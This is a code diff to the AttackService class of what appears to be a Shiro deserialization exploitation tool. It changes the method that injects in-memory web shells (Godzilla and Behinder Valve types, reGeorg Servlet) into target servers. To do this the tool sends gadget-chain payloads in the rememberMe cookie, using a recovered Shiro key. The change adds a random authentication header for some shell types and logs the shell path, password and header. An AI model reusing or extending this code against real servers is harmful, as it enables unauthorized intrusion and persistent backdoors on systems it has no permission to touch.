@@ -1,7 +1,6 @@
 
 package com.summersec.attack.core;
 
-import cn.hutool.http.HttpRequest;
 import cn.hutool.http.Method;
 import com.summersec.attack.deser.frame.Shiro;
 import com.summersec.attack.deser.payloads.ObjectPayload;
@@ -54,7 +53,6 @@ public class AttackService {
         this.shiroKeyWord = shiroKeyWord;
         this.globalHeader = globalHeader;
         this.postData = postData;
-
     }
 
     public HashMap<String, String> getCombineHeaders(HashMap<String, String> header) {
@@ -420,11 +418,15 @@ public class AttackService {
 
     public void injectMem(String memShellType, String shellPass, String shellPath) {
         String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
+        String randomHeader = getRandomString(8);
         if (injectRememberMe != null) {
             HashMap<String, String> header = new HashMap();
             header.put("Cookie", injectRememberMe);
             header.put("p", shellPass);
             header.put("path", shellPath);
+            if (memShellType.equals("哥斯拉[Valve]") || memShellType.equals("冰蝎[Valve]")) {
+                header.put("h", randomHeader);
+            }
 
             try {
                 String b64Bytecode = MemBytes.getBytes(memShellType);
@@ -436,6 +438,9 @@ public class AttackService {
                     this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
                     if (!memShellType.equals("reGeorg[Servlet]")) {
                         this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
+                    }
+                    if (memShellType.equals("哥斯拉[Valve]") || memShellType.equals("冰蝎[Valve]")) {
+                        this.mainController.InjOutputArea.appendText(Utils.log("请求头：" + randomHeader + ": " + randomHeader));
                     }
                 } else {
                     if (result.contains("->|") && result.contains("|<-")) {
